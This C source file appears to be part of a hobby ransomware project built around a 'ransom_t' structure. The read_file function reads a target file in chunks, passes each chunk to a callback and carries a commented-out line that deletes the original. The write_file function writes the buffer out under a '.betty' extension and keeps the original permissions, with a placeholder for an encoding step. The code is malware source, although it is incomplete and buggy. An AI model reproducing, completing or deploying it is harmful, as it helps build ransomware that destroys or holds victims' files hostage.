#include "fournights.h"
/**
  * read_file - reads lines from a file, and executes a function on them.
 (* TODO: Function pointer is of type char **;
 (*       NOT MODULAR.
 (*       Build a helper function to set
 (*       the right return type?
  * Deletes the file afterwards
  * @filepath: filepath to read
  * @head: head of a linked list
  * @fxn: pointer to function to enact on lines
  * Return: number of bytes read
 **/
size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *))
{
	size_t bytes_read;
	FILE *fd = NULL;
	off_t file_offset = ransom->target_file_buf->file_offset;
	struct stat file_info;

	if (!filepath || !ransom)
		return(0);

	lstat(filepath, &file_info);
	ransom->target_file_buf->file_info = file_info;
	fd = fopen(filepath, "rb");
	fseek(fd, file_offset, SEEK_SET);
	if(file_info.st_size == 0)
	{
		fclose(fd);
		fprintf(stderr, "File is empty\n");
		return(0);
	}
	if (file_info.st_size > BUFSIZE * 4)
		bytes_read = BUFSIZE * 4;
	else
		bytes_read = (size_t)file_info.st_size;
	ransom->target_file_buf->bytes_read = bytes_read;
	ransom->target_file_buf->file_offset += bytes_read;
	fread((char *)ransom->target_file_buf->buf, bytes_read, sizeof(char), fd);

	/* DEBUGGING BLOCK */
ransom->target_file_buf->buf[ransom->target_file_buf->file_offset] = '\0';
	/* END DEBUGGING BLOCK */

	if(fxn)
		fxn(ransom->target_file_buf->buf, ransom);
	fclose(fd);
	/* Disabled for debugging
	unlink(filepath);
	*/
	return (bytes_read);
}

/**
  * write_file - writes the contents of a buffer to a file.
  * @filepath: filepath to write
  * @buffer: buffer to write into the file
  * Return: number of bytes read
 **/
char *write_file(char *buffer, ransom_t *ransom)
{
	unsigned int new_BUFSIZE = BUFSIZE;
	size_t new_ext_len = 0;
	size_t filepath_len = 0;
	size_t buf_size = 0;
	size_t bytes_written = 0;
	char *new_ext = ".betty";
	char *filepath = NULL;
	FILE *fd = NULL;

	filepath = ransom->target_file_buf->filepath;
	new_ext_len = my_strlen(new_ext);
	filepath_len = my_strlen(filepath);
	buf_size = ransom->target_file_buf->bytes_read;
	if(filepath_len > BUFSIZE)
	{
		new_BUFSIZE *= 2;
		filepath = recalloc(filepath, BUFSIZE, new_BUFSIZE);
	}
	my_strncat(filepath, new_ext, filepath_len, new_ext_len);
	/* Open FD */
	fd = fopen(filepath, "wb+");
/* TODO: base64encode function causes massive memory leaks */
	/*
	encrypt_buf = base64encode((const void *)ransom_buf, buf_size);
	*/
	if ((bytes_written = fwrite(buffer, buf_size, sizeof(char), fd)) < 1)
		fprintf(stderr, "No bytes written\n");
	/*
	free(encrypt_buf);
	*/

	fclose(fd);
	chmod(filepath, ransom->target_file_buf->file_info.st_mode);
	return(buffer);
}
